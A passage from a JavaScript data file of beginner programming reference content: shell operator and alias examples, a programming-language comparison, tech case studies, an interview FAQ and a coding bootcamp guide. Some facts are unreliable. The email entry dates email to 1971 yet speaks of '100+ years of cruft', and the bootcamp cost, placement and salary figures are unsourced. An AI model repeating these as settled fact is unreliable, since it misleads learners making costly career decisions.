        { syntax: 'cmd < file', does: 'Read stdin from file' },
        { syntax: 'cmd1 && cmd2', does: 'Run cmd2 only if cmd1 succeeded' },
        { syntax: 'cmd1 || cmd2', does: 'Run cmd2 only if cmd1 failed' },
        { syntax: 'cmd1 ; cmd2', does: 'Run cmd2 regardless' },
      ],
      examples: [
        'ls | grep test → list files containing "test"',
        'cat log | grep ERROR | wc -l → count errors',
        'find . -name "*.log" | xargs rm → delete all .log files',
      ],
    },
    {
      command: 'Aliases',
      purpose: 'Shortcuts for frequent commands',
      examples: [
        'alias ll="ls -lah"',
        'alias gs="git status"',
        'alias ..="cd .."',
        'alias serve="python3 -m http.server"',
      ],
      persistent: 'Add to ~/.bashrc or ~/.zshrc',
    },
  ];

  // ─── Programming languages overview (verbose) ───────────────────
  var PROGRAMMING_LANGUAGES = [
    {
      name: 'JavaScript',
      birthYear: 1995,
      creator: 'Brendan Eich',
      paradigm: 'Multi-paradigm: functional, OOP, event-driven',
      typing: 'Dynamic, weakly typed',
      runtime: 'Browser, Node.js, Deno, Bun',
      strengths: ['Web standard', 'Massive ecosystem', 'Async-first', 'Cross-platform'],
      weaknesses: ['Quirks (type coercion)', 'Older code is messy', 'Easy to write bad code'],
      bestFor: 'Web frontends, full-stack apps, browser extensions',
      learnFirst: 'YES — the most accessible. Used everywhere.',
      community: 'Largest programming community',
      future: 'Strong. Standards-driven evolution.',
    },
    {
      name: 'TypeScript',
      birthYear: 2012,
      creator: 'Microsoft',
      paradigm: 'JavaScript + static typing',
      typing: 'Static (gradual)',
      runtime: 'Compiles to JavaScript, runs anywhere JS does',
      strengths: ['Type safety', 'Better IDE support', 'Catches bugs at compile time'],
      weaknesses: ['Extra compile step', 'Learning curve', 'Type complexity'],
      bestFor: 'Large JavaScript projects, team work, production apps',
      learnFirst: 'After JavaScript fundamentals',
      community: 'Large + growing',
      future: 'Very strong. Microsoft + community.',
    },
    {
      name: 'Python',
      birthYear: 1991,
      creator: 'Guido van Rossum',
      paradigm: 'Multi-paradigm: OOP, functional, procedural',
      typing: 'Dynamic, strongly typed',
      runtime: 'CPython (most common), PyPy, Jython',
      strengths: ['Readable syntax', 'Huge data science ecosystem', 'Great for ML', 'Easy to learn'],
      weaknesses: ['Slower than compiled languages', 'GIL limits threading', 'Mobile development limited'],
      bestFor: 'Data science, ML, scripting, web backends, education',
      learnFirst: 'Good second language. Some learn it first.',
      community: 'Very large',
      future: 'Strong. Especially in AI/ML.',
    },
    {
      name: 'Java',
      birthYear: 1995,
      creator: 'James Gosling (Sun)',
      paradigm: 'OOP (with functional additions)',
      typing: 'Static',
      runtime: 'JVM (Java Virtual Machine)',
      strengths: ['Mature ecosystem', 'Performance', 'Enterprise tooling', 'Android development'],
      weaknesses: ['Verbose syntax', 'Slow startup', 'Old-style frameworks'],
      bestFor: 'Enterprise apps, Android, big data',
      learnFirst: 'Less common starter language now',
      community: 'Large enterprise community',
      future: 'Stable. Continues to evolve.',
    },
    {
      name: 'C++',
      birthYear: 1985,
      creator: 'Bjarne Stroustrup',
      paradigm: 'Multi-paradigm: OOP, procedural, generic',
      typing: 'Static, manual memory management',
      runtime: 'Compiled to machine code',
      strengths: ['Performance', 'Low-level control', 'Game engines', 'Systems programming'],
      weaknesses: ['Complexity', 'Manual memory = bugs', 'Steep learning curve'],
      bestFor: 'Game engines, embedded systems, performance-critical apps',
      learnFirst: 'Not for beginners',
      community: 'Strong but smaller than C/Java',
      future: 'Stable. Used where performance matters.',
    },
    {
      name: 'C',
      birthYear: 1972,
      creator: 'Dennis Ritchie',
      paradigm: 'Procedural',
      typing: 'Static',
      runtime: 'Compiled to machine code',
      strengths: ['Low-level', 'Fast', 'Foundational', 'Operating systems'],
      weaknesses: ['Manual memory = bugs', 'No built-in OOP', 'Verbose'],
      bestFor: 'OS development, embedded systems, performance',
      learnFirst: 'Helps understand other languages',
      community: 'Stable, smaller',
      future: 'Continues to underpin much of computing',
    },
    {
      name: 'Rust',
      birthYear: 2010,
      creator: 'Graydon Hoare (Mozilla)',
      paradigm: 'Systems + functional + OOP',
      typing: 'Static, ownership-based memory management',
      runtime: 'Compiled to machine code',
      strengths: ['Memory safety without GC', 'Performance', 'Concurrency'],
      weaknesses: ['Steep learning curve (borrow checker)', 'Slower compilation'],
      bestFor: 'Systems programming, performance-critical, embedded',
      learnFirst: 'After learning C or another systems language',
      community: 'Growing rapidly',
      future: 'Very strong. Linux kernel inclusion, growing adoption.',
    },
    {
      name: 'Go (Golang)',
      birthYear: 2009,
      creator: 'Google (Pike, Thompson, Griesemer)',
      paradigm: 'Procedural, OOP, concurrent',
      typing: 'Static',
      runtime: 'Compiled to machine code',
      strengths: ['Simple syntax', 'Fast compilation', 'Excellent concurrency', 'Easy distribution'],
      weaknesses: ['Less expressive', 'Limited generics (until 1.18)', 'No exceptions'],
      bestFor: 'Microservices, CLIs, infrastructure tools (Docker, Kubernetes)',
      learnFirst: 'Good for distributed systems',
      community: 'Strong, especially in infrastructure',
      future: 'Strong. Used by Google + many others.',
    },
    {
      name: 'Ruby',
      birthYear: 1995,
      creator: 'Yukihiro Matsumoto',
      paradigm: 'OOP, functional',
      typing: 'Dynamic',
      runtime: 'CRuby (MRI), JRuby, Rubinius',
      strengths: ['Readable', 'Rails framework excellent', 'Fast development', 'Strong testing culture'],
      weaknesses: ['Slower than newer languages', 'Less mainstream than peak'],
      bestFor: 'Rails web apps, prototyping, scripting',
      learnFirst: 'Good for web fundamentals',
      community: 'Strong but smaller than peak',
      future: 'Stable. Rails still used widely.',
    },
    {
      name: 'PHP',
      birthYear: 1994,
      creator: 'Rasmus Lerdorf',
      paradigm: 'OOP, procedural',
      typing: 'Dynamic',
      runtime: 'PHP runtime',
      strengths: ['Web-first design', 'WordPress + Drupal massive', 'Cheap hosting', 'Mature'],
      weaknesses: ['Historical inconsistencies', 'Less hip than newer languages', 'Performance vs newer'],
      bestFor: 'WordPress, Drupal, traditional web apps, Facebook (uses HHVM)',
      learnFirst: 'Less common as first language now',
      community: 'Large, mature',
      future: 'Stable. Will continue powering 70%+ of websites.',
    },
    {
      name: 'Swift',
      birthYear: 2014,
      creator: 'Apple',
      paradigm: 'OOP, functional, protocol-oriented',
      typing: 'Static',
      runtime: 'LLVM-compiled',
      strengths: ['Modern syntax', 'Type safety', 'Memory safety', 'iOS development'],
      weaknesses: ['Apple ecosystem-focused', 'Less ecosystem outside iOS'],
      bestFor: 'iOS apps, Mac apps, server-side Swift',
      learnFirst: 'After learning fundamentals',
      community: 'Strong in Apple ecosystem',
      future: 'Strong. Apple\'s flagship language.',
    },
    {
      name: 'Kotlin',
      birthYear: 2011,
      creator: 'JetBrains',
      paradigm: 'OOP, functional',
      typing: 'Static',
      runtime: 'JVM (interoperates with Java)',
      strengths: ['Modern JVM language', 'Less verbose than Java', 'Android development', 'Type safety'],
      weaknesses: ['Smaller community than Java', 'Compile times'],
      bestFor: 'Android apps, server-side JVM applications',
      learnFirst: 'After learning fundamentals',
      community: 'Growing rapidly (Google promotes for Android)',
      future: 'Strong. Replacing Java for Android development.',
    },
    {
      name: 'C#',
      birthYear: 2000,
      creator: 'Microsoft (Anders Hejlsberg)',
      paradigm: 'OOP, functional, generic',
      typing: 'Static',
      runtime: '.NET runtime',
      strengths: ['Microsoft ecosystem', 'Unity game development', 'Strong tooling', 'Modern syntax'],
      weaknesses: ['Historically Windows-only (now cross-platform)', 'Microsoft dependency'],
      bestFor: 'Enterprise apps, Unity games, Windows apps, cross-platform via .NET',
      learnFirst: 'Good if you know other C-style languages',
      community: 'Large',
      future: 'Strong. Microsoft investment.',
    },
    {
      name: 'SQL',
      birthYear: 1970,
      creator: 'IBM (Donald Chamberlin)',
      paradigm: 'Declarative, set-based',
      typing: 'Static',
      runtime: 'Database management systems',
      strengths: ['Universal database language', 'Powerful queries', 'Standard'],
      weaknesses: ['Different dialects per DB', 'Limited general-purpose use'],
      bestFor: 'Data queries, reports, ETL',
      learnFirst: 'YES — needed for almost any backend job',
      community: 'Universal (everyone uses it)',
      future: 'Permanent. Will outlast you + me.',
    },
    {
      name: 'R',
      birthYear: 1993,
      creator: 'Ross Ihaka + Robert Gentleman',
      paradigm: 'Functional, OOP',
      typing: 'Dynamic',
      runtime: 'R interpreter',
      strengths: ['Statistical computing', 'Data visualization', 'Academic statistics'],
      weaknesses: ['Slow', 'Quirky', 'Limited outside data analysis'],
      bestFor: 'Statistical analysis, scientific computing',
      learnFirst: 'After data science fundamentals',
      community: 'Statistical + academic',
      future: 'Stable. Python is taking some market share.',
    },
    {
      name: 'Julia',
      birthYear: 2012,
      creator: 'Bezanson, Karpinski, Shah, Edelman',
      paradigm: 'Multi-paradigm, scientific computing focus',
      typing: 'Dynamic with type inference',
      runtime: 'JIT-compiled',
      strengths: ['Fast', 'Scientific computing', 'Beautiful math syntax'],
      weaknesses: ['Smaller ecosystem', 'Startup time'],
      bestFor: 'Scientific computing, numerical analysis',
      learnFirst: 'After Python for scientific work',
      community: 'Growing in academic/scientific',
      future: 'Promising but slow adoption.',
    },
    {
      name: 'Scala',
      birthYear: 2003,
      creator: 'Martin Odersky',
      paradigm: 'Functional, OOP',
      typing: 'Static',
      runtime: 'JVM',
      strengths: ['Powerful type system', 'Functional + OOP', 'Big data (Spark)'],
      weaknesses: ['Complexity', 'Slow compilation', 'Steep learning curve'],
      bestFor: 'Big data, functional programming on JVM',
      learnFirst: 'After learning fundamentals',
      community: 'Strong in big data',
      future: 'Stable.',
    },
    {
      name: 'Haskell',
      birthYear: 1990,
      creator: 'Various academics',
      paradigm: 'Pure functional, lazy evaluation',
      typing: 'Static, type inference',
      runtime: 'GHC compiler',
      strengths: ['Mathematical purity', 'Strong type system', 'Concurrency'],
      weaknesses: ['Steep learning curve', 'Limited industry adoption', 'Different paradigm'],
      bestFor: 'Research, compilers, academic projects',
      learnFirst: 'After other languages — teaches functional thinking',
      community: 'Small but passionate',
      future: 'Niche but stable.',
    },
    {
      name: 'Lua',
      birthYear: 1993,
      creator: 'Pontifical Catholic University of Rio',
      paradigm: 'Procedural, OOP',
      typing: 'Dynamic',
      runtime: 'Lua interpreter (tiny)',
      strengths: ['Small + embeddable', 'Fast', 'Game scripting'],
      weaknesses: ['Smaller community', 'Limited standard library'],
      bestFor: 'Game scripting (Roblox), embedded systems',
      learnFirst: 'Good intro language',
      community: 'Small + niche',
      future: 'Stable in gaming + embedded.',
    },
    {
      name: 'Elixir',
      birthYear: 2011,
      creator: 'José Valim',
      paradigm: 'Functional, concurrent',
      typing: 'Dynamic',
      runtime: 'BEAM VM (from Erlang)',
      strengths: ['Concurrency', 'Fault tolerance', 'Modern syntax'],
      weaknesses: ['Less mainstream', 'Smaller ecosystem'],
      bestFor: 'Telecom, real-time apps, distributed systems',
      learnFirst: 'After functional fundamentals',
      community: 'Growing',
      future: 'Strong for specific use cases.',
    },
  ];

  // ─── Bonus deep-dive case studies ────────────────────────────────
  var EXTRA_CASE_STUDIES = [
    {
      title: 'How Google Search Works (Simplified)',
      domain: 'Algorithms + scale',
      keyFacts: [
        'Google indexes ~50 billion pages',
        'Returns results in <0.2 seconds typically',
        'Uses thousands of servers worldwide',
        'PageRank algorithm uses link graph',
        'Now uses ML + AI for relevance',
      ],
      mechanism: [
        '1. Crawlers traverse the web following links',
        '2. Pages are indexed (parsed + stored)',
        '3. Queries are processed: parsed, intent detected',
        '4. Index searched for matching pages',
        '5. PageRank + many signals rank results',
        '6. AI/ML refines relevance',
        '7. Results returned in milliseconds',
      ],
      lessons: [
        'Scale: distributing work across many machines',
        'Caching: frequent queries cached',
        'Latency: every ms matters at this scale',
        'AI: improves results',
        'Spam: constant adversarial battle',
      ],
      educationalValue: 'Demonstrates that real systems are complex multi-layered. Each layer is studied + optimized.',
    },
    {
      title: 'How Spotify Recommendations Work',
      domain: 'Machine learning + recommendation systems',
      keyFacts: [
        'Spotify has 600+ million users',
        'Catalog of 100+ million songs',
        'Discover Weekly launched in 2015',
        'Uses collaborative filtering + audio analysis + NLP',
        'Personalized to each user',
      ],
      mechanism: [
        '1. Collaborative filtering: "people like you also liked X"',
        '2. Audio analysis: extracts features from songs (tempo, mood, etc.)',
        '3. NLP analysis: of song lyrics + descriptions',
        '4. User\'s listening history + skips + likes weighted',
        '5. ML model combines signals',
        '6. Generated playlists updated weekly',
      ],
      lessons: [
        'Recommendations combine many signals',
        'Personalization is computationally expensive',
        'A/B testing different algorithms in production',
        'Cold start (new users) hard to handle',
        'Trade-off: novelty vs familiarity',
      ],
      educationalValue: 'Real ML system. Shows complexity behind "simple" recommendations.',
    },
    {
      title: 'How Encryption Protects Your Communications',
      domain: 'Cryptography',
      keyFacts: [
        'HTTPS protects 95%+ of web traffic now',
        'Modern crypto based on math problems hard to reverse',
        'Quantum computers may threaten current crypto',
        'End-to-end encryption (E2EE) means even service can\'t read',
      ],
      mechanism: [
        '1. Client + server exchange public keys',
        '2. They agree on a shared secret (Diffie-Hellman)',
        '3. Communications encrypted with shared secret',
        '4. Each session uses fresh keys (forward secrecy)',
        '5. Even if intercepted, data is gibberish without key',
      ],
      lessons: [
        'Cryptography depends on math, not "obfuscation"',
        'Open algorithms are stronger than secret ones',
        'Key management is the hardest part',
        'Backdoors weaken security for everyone',
      ],
      educationalValue: 'Foundations of modern digital security. Connect math to real impact.',
    },
    {
      title: 'How Cryptocurrency Works (Bitcoin Specifically)',
      domain: 'Distributed systems + cryptography',
      keyFacts: [
        'Bitcoin launched 2009 by pseudonymous Satoshi Nakamoto',
        'Decentralized: no central authority',
        'Uses public blockchain ledger',
        'Currently ~$1+ trillion market cap (volatile)',
        'Energy use is significant (debate over environmental impact)',
      ],
      mechanism: [
        '1. Transactions broadcast to network',
        '2. Miners compete to package transactions into a block',
        '3. Mining is proof-of-work: solving cryptographic puzzles',
        '4. Winning miner adds block to chain + gets reward',
        '5. Everyone verifies + accepts the new block',
        '6. Once on chain, transactions are immutable',
      ],
      lessons: [
        'Decentralized systems are POSSIBLE',
        'Trade-offs: decentralization vs efficiency',
        'Crypto is technically complex but has real applications',
        'Environmental considerations matter',
        'Regulatory landscape evolving',
      ],
      educationalValue: 'Real-world example of distributed consensus. Touches CS, economics, ethics.',
    },
    {
      title: 'How Self-Driving Cars Work (High Level)',
      domain: 'AI + robotics + sensors',
      keyFacts: [
        'Many companies racing to solve (Tesla, Waymo, Cruise, etc.)',
        'Combine sensors: cameras, LIDAR, radar, GPS',
        'Use ML models trained on millions of driving hours',
        'Still don\'t handle all edge cases (snow, construction, weird situations)',
        'Tragic accidents have occurred',
      ],
      mechanism: [
        '1. Sensors collect data about environment',
        '2. Computer vision identifies objects (cars, pedestrians, signs)',
        '3. ML models predict object behavior',
        '4. Path planner computes safe route',
        '5. Actuators control steering, brakes, acceleration',
        '6. Decisions every fraction of a second',
      ],
      lessons: [
        'AI alone insufficient — needs sensors + safety',
        'Edge cases are where things go wrong',
        'Liability questions are real',
        'Society debate about adoption pace',
      ],
      educationalValue: 'Combines many CS fields. Real-world impact + ethics implications.',
    },
    {
      title: 'How CSS Layout Engines Work',
      domain: 'Web rendering',
      keyFacts: [
        'Modern browsers have sophisticated layout engines',
        'CSS Grid + Flexbox are recent (mid-2010s)',
        'Layout is computed every time DOM or CSS changes',
        'Render pipeline: parse → layout → paint → compose',
        'Optimization techniques can dramatically improve performance',
      ],
      mechanism: [
        '1. Browser parses HTML into DOM',
        '2. CSS parsed into CSSOM',
        '3. Combined into render tree (only visible elements)',
        '4. Layout engine calculates positions + sizes',
        '5. Paint draws pixels',
        '6. Composite layers combined for final output',
        '7. Repeat on changes (efficiently — only invalidated parts)',
      ],
      lessons: [
        'Performance comes from understanding the pipeline',
        'transform + opacity are fastest (compositor-only)',
        'Layout thrashing destroys performance',
        'will-change + contain hints help',
      ],
      educationalValue: 'Demystifies what browsers actually do.',
    },
    {
      title: 'How Email Works (Behind the Scenes)',
      domain: 'Networking',
      keyFacts: [
        'Email predates the web (1971)',
        'SMTP, IMAP, POP3 are the core protocols',
        'Modern email has 100+ years of cruft + extensions',
        'Spam filters use ML + reputation',
        'Most email is automated (newsletters, transactional)',
      ],
      mechanism: [
        '1. You write email + click Send',
        '2. Your email client uses SMTP to send to your email server',
        '3. Your server queries DNS to find recipient server',
        '4. Server transfers email using SMTP to recipient server',
        '5. Recipient server stores email in mailbox',
        '6. Recipient checks email using IMAP or POP3',
      ],
      lessons: [
        'Old protocols can be hard to change',
        'Security added later (SPF, DKIM, DMARC)',
        'Email is harder to secure than designed',
        'Distributed system: no central authority',
      ],
      educationalValue: 'Layered protocols. How protocols compose.',
    },
    {
      title: 'How Modern AI Image Generation Works',
      domain: 'AI + image processing',
      keyFacts: [
        'DALL-E, Midjourney, Stable Diffusion are popular',
        'Generate images from text prompts',
        'Based on diffusion models (denoising)',
        'Trained on billions of image-text pairs',
        'Ethical concerns: training data, deepfakes',
      ],
      mechanism: [
        '1. Diffusion model trained on image-text pairs',
        '2. Image is repeatedly noised in training',
        '3. Model learns to predict + remove noise',
        '4. At generation: start with random noise',
        '5. Apply trained model to denoise toward desired image',
        '6. Result: image that matches text prompt',
      ],
      lessons: [
        'AI image generation is mathematical denoising',
        'Training data ethics matter',
        'Compute-intensive (GPUs required)',
        'Creative + concerning applications',
      ],
      educationalValue: 'Demystifies image AI. Touches CS, math, ethics.',
    },
    {
      title: 'How Open-Source Software Saved the Internet',
      domain: 'Open source',
      keyFacts: [
        'Linux runs most servers',
        'Apache, Nginx run most websites',
        'MySQL, PostgreSQL, Mongo run most databases',
        'Most languages (Python, JavaScript, etc.) are open',
        'Modern internet built on free + open source',
      ],
      mechanism: [
        '1. Linux kernel released 1991 by Linus Torvalds',
        '2. Anyone could read + modify + distribute',
        '3. Thousands of contributors over decades',
        '4. Companies (Red Hat, Canonical) built businesses around support',
        '5. Linux now powers most servers + Android + supercomputers',
      ],
      lessons: [
        'Open source can compete with proprietary',
        'Collaboration scales',
        'Sustainable open source needs funding',
        'Some companies abuse open source — open ethics + economics emerging',
      ],
      educationalValue: 'Shows alternative to traditional software business models.',
    },
    {
      title: 'How Web 3.0 / Decentralization Movement Started',
      domain: 'Tech history',
      keyFacts: [
        'Original web (Web 1) was static (1990s)',
        'Web 2 was interactive social media (2000s+)',
        'Web 3.0 concept emerged 2014+',
        'Decentralized: blockchain-based',
        'Promised + delivered are different things',
      ],
      mechanism: [
        '1. Web 1: static documents',
        '2. Web 2: user-generated content + social networks',
        '3. Web 3 vision: decentralized + user-owned',
        '4. Crypto/blockchain as foundation',
        '5. But: many issues with adoption',
      ],
      lessons: [
        'Web evolves',
        'Centralization happens repeatedly',
        'Decentralization is harder than it sounds',
        'Some tech is solution looking for problem',
      ],
      educationalValue: 'Tech history. Hype cycles.',
    },
    {
      title: 'How CDNs Make the Internet Fast',
      domain: 'Networking',
      keyFacts: [
        'CDN = Content Delivery Network',
        'Cloudflare, Akamai, AWS CloudFront are major',
        'Cache content close to users worldwide',
        'Can speed up sites 5-10x',
        'Also provide DDoS protection',
      ],
      mechanism: [
        '1. Origin server has content',
        '2. CDN has many "edge" servers around world',
        '3. First request: CDN fetches from origin + caches',
        '4. Subsequent requests served from edge near user',
        '5. Result: instant for most users',
      ],
      lessons: [
        'Latency is physics — you can\'t beat speed of light',
        'Caching is your friend',
        'Edge computing extends this concept',
      ],
      educationalValue: 'Real-world distributed systems.',
    },
    {
      title: 'The Y2K Bug + What We Learned',
      domain: 'History + lessons',
      keyFacts: [
        'Many programs stored year as 2 digits',
        '1999 → "99". 2000 → "00" or 1900?',
        'Catastrophic predictions were made',
        '$300-600 billion spent globally on remediation',
        'Disaster largely averted',
      ],
      mechanism: [
        '1. Memory was expensive in 1970s-80s',
        '2. Saving 2 bytes per record × millions of records = big savings',
        '3. Engineers thought "no one will use this in 2000"',
        '4. Software persists longer than anticipated',
        '5. Massive remediation effort in 1999',
      ],
      lessons: [
        'Code persists longer than expected',
        'Edge cases (rollover, leap years) matter',
        'Future-proof critical systems',
        'Y2038 (Unix timestamp overflow) similar',
      ],
      educationalValue: 'Real engineering ethics. Long-term thinking.',
    },
    {
      title: 'How OpenAI ChatGPT Became Global',
      domain: 'Modern AI',
      keyFacts: [
        'Launched November 2022',
        '100 million users in 2 months (fastest in history)',
        'Based on GPT-3.5 + GPT-4',
        'Reshaped public perception of AI',
        'Significant economic + social impact',
      ],
      mechanism: [
        '1. Large language model trained on huge text corpus',
        '2. Fine-tuned with human feedback (RLHF)',
        '3. Conversational interface (vs. just API)',
        '4. Free tier for most users',
        '5. Iterative improvements (GPT-4, GPT-4o)',
      ],
      lessons: [
        'Interface + UX matter as much as capability',
        'Network effects + word-of-mouth',
        'Industry-transforming products are sometimes obvious in retrospect',
        'AI safety + ethics urgent',
      ],
      educationalValue: 'Real-world AI deployment. Tech adoption dynamics.',
    },
  ];

  // ─── Real-life programmer interview FAQ ──────────────────────────
  var INTERVIEW_FAQ = [
    {
      question: 'Tell me about yourself.',
      whatTheyWant: '90-second elevator pitch. Why you, what you\'ve done, why you\'re excited about this role.',
      template: 'Hi! I\'m [name]. I\'ve been [doing X] at [Y] for the last [Z]. I\'m especially interested in [specific area]. Most recently I built [specific project] which taught me [specific lesson]. I\'m excited about this role because [specific reason about THIS company].',
      antiPattern: 'Generic resume recap. No specifics.',
      practiceAdvice: 'Practice this until it\'s natural. Adapt for each company.',
    },
    {
      question: 'What\'s your greatest weakness?',
      whatTheyWant: 'Self-awareness + how you\'re improving. NOT a fake weakness.',
      template: 'I tend to [genuine weakness, e.g., dive into code too quickly without planning]. Recently I\'ve been [specific action — writing pseudocode first, using a planning template]. I\'m seeing [improvement].',
      antiPattern: '"I\'m a perfectionist" (everyone says this; it\'s fake).',
      practiceAdvice: 'Pick a real weakness. Show growth.',
    },
    {
      question: 'Why do you want to work here?',
      whatTheyWant: 'Specific knowledge of the company. Genuine interest.',
      template: 'I\'ve been following [specific work] at [company]. Specifically [specific product/initiative] addresses [specific need I care about]. I\'m excited to contribute to [specific project] because [why it matters to you].',
      antiPattern: 'Generic answer that applies to any company.',
      practiceAdvice: 'Research the company. Find specific things you admire.',
    },
    {
      question: 'Why are you leaving your current job? OR Why are you looking for a new role?',
      whatTheyWant: 'A constructive answer. NOT bashing your current employer.',
      template: 'I\'m grateful for what I\'ve learned at [current company]. I\'m looking for [specific growth — e.g., bigger scale, new tech, leadership]. This role offers [specific opportunity].',
      antiPattern: 'Complaining about old job. Negative tone.',
      practiceAdvice: 'Stay positive. Focus on what you want next.',
    },
    {
      question: 'Tell me about a challenging project.',
      whatTheyWant: 'STAR format: Situation, Task, Action, Result.',
      template: '**S**: When I was at [company], we needed to [problem]. **T**: My task was to [responsibility]. **A**: I [specific actions you took]. **R**: As a result, [measurable outcome].',
      antiPattern: 'Vague. No specifics. No outcome.',
      practiceAdvice: 'Have 3-5 stories prepared. Practice STAR format.',
    },
    {
      question: 'How do you handle disagreement with a coworker?',
      whatTheyWant: 'Respectful, collaborative approach. NOT confrontation.',
      template: 'I try to understand their perspective first. I ask questions. I express my view with reasons. We try to find common ground or compromise. If we can\'t agree, we escalate together.',
      antiPattern: '"I get my way." Or "I just go along with whatever."',
      practiceAdvice: 'Show conflict resolution skills.',
    },
    {
      question: 'How do you stay current with technology?',
      whatTheyWant: 'You\'re a learner. Specific sources.',
      template: 'I read [specific blogs/newsletters]. I follow [specific people on Twitter/LinkedIn]. I take [specific courses]. I contribute to [specific open-source projects].',
      antiPattern: '"I read tech news." (Too vague.)',
      practiceAdvice: 'Have actual sources you can name.',
    },
    {
      question: 'What\'s your experience with [specific tech]?',
      whatTheyWant: 'Honest assessment. Don\'t overclaim.',
      template: 'I\'ve used [tech] for [time period]. Specifically, I\'ve [specific projects]. I\'m strong at [areas]. I\'m still learning [other areas].',
      antiPattern: 'Claiming expertise you don\'t have. Or downplaying real skills.',
      practiceAdvice: 'Be honest. Show willingness to learn.',
    },
    {
      question: 'Tell me about a time you failed.',
      whatTheyWant: 'Self-awareness. Growth from failure.',
      template: 'At [company], I [specific mistake]. As a result, [consequence]. I learned [specific lesson]. Now I [changed behavior].',
      antiPattern: '"I never fail." Or describing failure as someone else\'s fault.',
      practiceAdvice: 'Have a real story. Show growth.',
    },
    {
      question: 'Where do you see yourself in 5 years?',
      whatTheyWant: 'Ambition + alignment with their company.',
      template: 'I see myself [growing in specific direction]. Ideally [specific role or accomplishment]. I want to develop [specific skills]. This role at [company] helps me get there because [specific reason].',
      antiPattern: '"In your job." (Cocky.) Or "I have no idea." (Drifting.)',
      practiceAdvice: 'Show direction without arrogance.',
    },
    {
      question: 'Walk me through your code.',
      whatTheyWant: 'Clear explanation. Trade-offs you considered.',
      template: 'I started with [approach]. The key insight was [insight]. I implemented it using [specific tech]. Trade-offs I considered: [list]. If I had more time, I\'d [improvement].',
      antiPattern: 'Reading code line by line without context.',
      practiceAdvice: 'Practice explaining your own code clearly.',
    },
    {
      question: 'Explain [technical concept] like I\'m a 5-year-old.',
      whatTheyWant: 'Communication skills. Conceptual clarity.',
      template: 'Use analogies. Real-world examples. Avoid jargon. Build up gradually.',
      antiPattern: 'Jargon-heavy explanation that doesn\'t match the request.',
      practiceAdvice: 'Practice ELI5 with various concepts.',
    },
    {
      question: 'What questions do you have for me?',
      whatTheyWant: 'You researched the company. You\'re engaged.',
      template: 'Ask: about the team. About day-to-day work. About what success looks like. About growth opportunities. About company culture.',
      antiPattern: 'No questions. Or asking about salary/benefits first.',
      practiceAdvice: 'Always have 3-5 questions prepared.',
    },
    {
      question: 'What\'s your expected salary?',
      whatTheyWant: 'Confidence + market awareness.',
      template: 'Research salary ranges for your role + experience + location. Aim for upper end. Always negotiable.',
      antiPattern: 'Saying too low (you underbid). Saying too high (you\'re cut).',
      practiceAdvice: 'Use Glassdoor, levels.fyi. Have a range, not a single number.',
    },
    {
      question: 'How do you handle stress?',
      whatTheyWant: 'Healthy coping. NOT denial.',
      template: 'I [healthy coping mechanism]. I prioritize, communicate with team, and ask for help when needed. I take breaks.',
      antiPattern: '"I love stress." Or "I never get stressed."',
      practiceAdvice: 'Show emotional intelligence.',
    },
  ];

  // ─── Coding bootcamp + alternative path guide ─────────────────────
  var BOOTCAMP_GUIDE = [
    {
      bootcamp: 'Hack Reactor',
      url: 'hackreactor.com',
      cost: '$18,000-22,000',
      duration: '12-19 weeks full-time',
      whatYouLearn: 'Full-stack JavaScript (React + Node + databases)',
      whoItsFor: 'People with some prior tech experience',
      reputation: 'Strong. One of original bootcamps.',
      outcomes: '~80% job placement within 6 months at $90K+ avg',
      considerations: 'Heavy time commitment. Need to dedicate full-time. Expensive.',
    },
    {
      bootcamp: 'App Academy',
      url: 'appacademy.io',
      cost: '$24,000 OR income-share agreement (no money up front)',
      duration: '24 weeks',
      whatYouLearn: 'Full-stack JavaScript (React + Rails)',
      whoItsFor: 'Highly motivated learners',
      reputation: 'Strong. Income-share model means they\'re aligned with student success.',
      outcomes: '~90% job placement at $80K+ avg',
      considerations: 'Income-share agreements have repayment caps but can total more than upfront tuition.',
    },
    {
      bootcamp: 'Codesmith',
      url: 'codesmith.io',
      cost: '$22,000',
      duration: '13 weeks',
      whatYouLearn: 'Full-stack JavaScript with open-source emphasis',
      whoItsFor: 'Mid-career switchers',
      reputation: 'Strong. Focus on quality.',
      outcomes: '~85% placement at $130K+ avg (higher salaries due to focus)',
      considerations: 'Selective admissions.',
    },
    {
      bootcamp: 'Flatiron School',
      url: 'flatironschool.com',
      cost: '$17,000',
      duration: '15 weeks full-time, 24 weeks part-time',
      whatYouLearn: 'Full-stack web dev. Also data science, cybersecurity tracks.',
      whoItsFor: 'Career switchers',
      reputation: 'Solid.',
      outcomes: '~78% placement at $74K+ avg',
      considerations: 'Acquired by WeWork (controversial history).',
    },
    {
      bootcamp: 'Springboard',
      url: 'springboard.com',
      cost: '$8,000-15,000',
      duration: 'Self-paced, 6-12 months part-time',
      whatYouLearn: 'Various tracks: software, data science, UX',
      whoItsFor: 'People who need flexibility',
      reputation: 'Decent.',
      outcomes: 'Variable. Job guarantee with refund.',
      considerations: 'Less intensive than full-time bootcamps. Self-discipline required.',
    },
    {
      bootcamp: 'Lambda School / Bloom Tech',
      url: 'bloomtech.com',
      cost: 'Income-share',
      duration: '6-9 months',
      whatYouLearn: 'Full-stack + cybersecurity + data science',
      whoItsFor: 'Career switchers',
      reputation: 'Mixed. Recent controversies.',
      outcomes: 'Variable.',
      considerations: 'ISA terms important to understand fully.',
    },
    {
      bootcamp: 'Self-taught path',
      url: 'freeCodeCamp.org, theodinproject.com',
      cost: 'Free (or low cost for paid courses)',
      duration: '6-18 months self-paced',
      whatYouLearn: 'Whatever you want to learn',
      whoItsFor: 'Disciplined self-learners',
      reputation: 'Variable based on portfolio',
      outcomes: 'No guarantees. Depends on your effort.',
      considerations: 'No structure. No instructors. Must be self-motivated. Many succeed. Many give up.',
    },
    {
      bootcamp: 'Computer Science degree (4-year)',
      url: 'Various universities',
      cost: '$0-200,000 depending on school',
      duration: '4 years',
      whatYouLearn: 'Algorithms, data structures, theory, systems, math',
      whoItsFor: 'Younger learners. Those who want deep foundations.',
      reputation: 'Very strong',
      outcomes: 'Generally good. ~95% employment after grad school.',
      considerations: 'Most expensive option. Includes math + theory beyond coding. Networking + internships valuable.',
    },
    {
      bootcamp: 'Online MOOC (Coursera, edX)',
      url: 'coursera.org, edx.org',
      cost: 'Free to audit, $50-100/month for certificates',
      duration: 'Self-paced, weeks to months',
      whatYouLearn: 'Specific topics: ML, web dev, CS basics',
      whoItsFor: 'Specific skill building',
      reputation: 'Variable',
      outcomes: 'Good for learning. Less direct job pipeline than bootcamps.',
      considerations: 'Cheap. Flexible. Less hands-on than bootcamps. Less structured.',
    },
    {
